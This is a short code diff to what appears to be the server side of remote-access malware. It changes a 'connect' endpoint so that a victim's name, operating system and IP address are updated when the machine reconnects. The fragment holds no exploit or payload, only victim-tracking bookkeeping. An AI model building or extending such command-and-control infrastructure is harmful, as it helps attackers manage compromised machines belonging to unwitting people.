@@ -15,7 +15,13 @@ async def connect(victim:Victim, response: Response):
     if db.victims.find_one({"UUID":victim.UUID}) is None:
         db.victims.insert_one({"UUID":victim.UUID, "name":victim.name, "OS":victim.OS, "IP":victim.IP})
         response.status_code = status.HTTP_201_CREATED
-    return None
+    else:
+        db.victims.update_one({"UUID":victim.UUID}, {
+            "$set":{
+                "name":victim.name,
+                "OS":victim.OS,
+                "IP":victim.IP
+            }})
 
 sockets = manager.socketManager()
 
